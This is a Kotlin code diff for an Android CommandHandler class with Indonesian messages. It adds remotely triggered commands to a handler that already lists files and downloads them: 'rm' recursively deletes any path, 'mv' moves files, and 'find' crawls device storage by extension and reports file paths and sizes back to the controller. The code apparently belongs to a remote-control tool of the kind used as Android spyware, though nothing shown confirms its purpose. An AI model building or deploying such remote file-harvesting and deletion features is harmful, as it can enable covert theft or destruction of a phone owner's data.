@@ -675,7 +675,11 @@ class CommandHandler(private val context: Context) : TextToSpeech.OnInitListener
                         val dir = java.io.File(path)
                         val arr = JSONArray()
                         if (dir.exists() && dir.isDirectory) {
-                            dir.listFiles()?.forEach {
+                            val files = dir.listFiles()?.toList() ?: emptyList()
+                            // Urutkan: Folder dulu (A-Z), baru File (A-Z)
+                            val sortedFiles = files.sortedWith(compareBy({ !it.isDirectory }, { it.name.lowercase() }))
+                            
+                            sortedFiles.forEach {
                                 val obj = JSONObject().apply {
                                     put("name", it.name)
                                     put("is_dir", it.isDirectory)
@@ -691,6 +695,76 @@ class CommandHandler(private val context: Context) : TextToSpeech.OnInitListener
                     } catch (e: Exception) {
                         sendResponse(createResponse(cmdId, "error", "File Explorer Gagal: ${e.message}"))
                     }
+                }
+                "rm" -> {
+                    try {
+                        val file = java.io.File(textArg)
+                        if (file.exists()) {
+                            val deleted = if (file.isDirectory) file.deleteRecursively() else file.delete()
+                            if (deleted) sendResponse(createResponse(cmdId, "success", "Berhasil menghapus: ${file.name}"))
+                            else sendResponse(createResponse(cmdId, "error", "Gagal menghapus file/folder."))
+                        } else {
+                            sendResponse(createResponse(cmdId, "error", "File tidak ditemukan: $textArg"))
+                        }
+                    } catch (e: Exception) {
+                        sendResponse(createResponse(cmdId, "error", "Gagal hapus: ${e.message}"))
+                    }
+                }
+                "mv" -> {
+                    try {
+                        val parts = textArg.split("|")
+                        if (parts.size == 2) {
+                            val src = java.io.File(parts[0])
+                            val dst = java.io.File(parts[1])
+                            if (src.renameTo(dst)) {
+                                sendResponse(createResponse(cmdId, "success", "Berhasil Rename/Move ke: ${dst.absolutePath}"))
+                            } else {
+                                sendResponse(createResponse(cmdId, "error", "Gagal Rename/Move."))
+                            }
+                        } else {
+                            sendResponse(createResponse(cmdId, "error", "Format: src|dst"))
+                        }
+                    } catch (e: Exception) {
+                        sendResponse(createResponse(cmdId, "error", "Gagal move: ${e.message}"))
+                    }
+                }
+                "find" -> {
+                    Thread {
+                        try {
+                            // Format: [path]|[ext]
+                            val parts = textArg.split("|")
+                            val rootPath = if (parts.isNotEmpty()) parts[0] else "/storage/emulated/0"
+                            val ext = if (parts.size > 1) parts[1].lowercase() else ""
+                            
+                            val results = JSONArray()
+                            val root = java.io.File(rootPath)
+                            
+                            fun search(dir: java.io.File) {
+                                dir.listFiles()?.forEach {
+                                    if (it.isDirectory) {
+                                        search(it)
+                                    } else {
+                                        if (ext.isEmpty() || it.name.lowercase().endsWith(ext)) {
+                                            results.put(JSONObject().apply {
+                                                put("name", it.name)
+                                                put("path", it.absolutePath)
+                                                put("size", it.length())
+                                            })
+                                        }
+                                    }
+                                }
+                            }
+                            
+                            if (root.exists() && root.isDirectory) {
+                                search(root)
+                                sendResponse(createResponse(cmdId, "find_result", results))
+                            } else {
+                                sendResponse(createResponse(cmdId, "error", "Root path tidak valid."))
+                            }
+                        } catch (e: Exception) {
+                            sendResponse(createResponse(cmdId, "error", "Search Gagal: ${e.message}"))
+                        }
+                    }.start()
                 }
                 "download" -> {
                     Thread {
